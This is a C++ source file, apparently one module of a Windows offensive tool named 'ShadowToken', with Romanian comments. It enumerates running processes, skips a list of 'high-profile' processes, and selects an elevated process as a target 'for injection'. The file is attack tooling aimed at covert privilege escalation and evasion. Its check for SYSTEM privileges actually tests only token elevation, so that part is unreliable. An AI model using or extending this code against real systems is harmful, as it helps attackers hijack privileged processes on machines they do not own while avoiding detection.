#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <string>
#include <vector>
#include "../api_wrappers/api_compatibility.cpp"

namespace ShadowToken {

    struct ProcessInfo {
        DWORD processID;
        std::wstring processName;
    };

    class ProcessEnumerator {
    public:
        ProcessEnumerator(const std::vector<std::wstring>& highProfileProcesses)
            : highProfileProcesses(highProfileProcesses), apiCompat() {}

        // Enumerare și filtrare a proceselor low-profile
        std::vector<ProcessInfo> EnumerateLowProfileProcesses() {
            std::vector<ProcessInfo> lowProfileProcesses;
            HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snapshot == INVALID_HANDLE_VALUE) {
                std::cerr << "[Error] Nu s-a putut crea snapshot-ul proceselor: " << GetLastError() << std::endl;
                return lowProfileProcesses;
            }

            PROCESSENTRY32 processEntry;
            processEntry.dwSize = sizeof(PROCESSENTRY32);

            if (Process32First(snapshot, &processEntry)) {
                do {
                    std::wstring processName = processEntry.szExeFile;
                    DWORD processID = processEntry.th32ProcessID;

                    if (IsLowProfileProcess(processName)) {
                        lowProfileProcesses.push_back({ processID, processName });
                    }
                } while (Process32Next(snapshot, &processEntry));
            }

            CloseHandle(snapshot);
            return lowProfileProcesses;
        }

        // Selectează un proces cu privilegii SYSTEM pentru injectare
        ProcessInfo SelectTargetProcess() {
            std::vector<ProcessInfo> processes = EnumerateLowProfileProcesses();
            for (const auto& process : processes) {
                HANDLE processHandle = apiCompat.OpenProcessCompat(PROCESS_QUERY_INFORMATION, FALSE, process.processID);
                if (!processHandle) continue;

                HANDLE token;
                if (apiCompat.OpenProcessTokenCompat(processHandle, TOKEN_QUERY, &token)) {
                    if (HasSystemPrivileges(token)) {
                        CloseHandle(token);
                        CloseHandle(processHandle);
                        std::wcout << "[Info] Procesul țintă selectat: " << process.processName 
                                   << " (PID: " << process.processID << ")" << std::endl;
                        return process;
                    }
                    CloseHandle(token);
                }
                CloseHandle(processHandle);
            }
            return { 0, L"" };
        }

    private:
        std::vector<std::wstring> highProfileProcesses;
        APICompatibility apiCompat;

        // Verifică dacă procesul este low-profile și evită procesele high-profile
        bool IsLowProfileProcess(const std::wstring& processName) {
            for (const auto& highProfile : highProfileProcesses) {
                if (_wcsicmp(processName.c_str(), highProfile.c_str()) == 0) {
                    return false;
                }
            }
            return true;
        }

        // Verifică dacă token-ul procesului are privilegii SYSTEM
        bool HasSystemPrivileges(HANDLE token) {
            TOKEN_ELEVATION elevation;
            DWORD returnLength;
            if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &returnLength)) {
                return elevation.TokenIsElevated != 0;
            }
            return false;
        }
    };
}
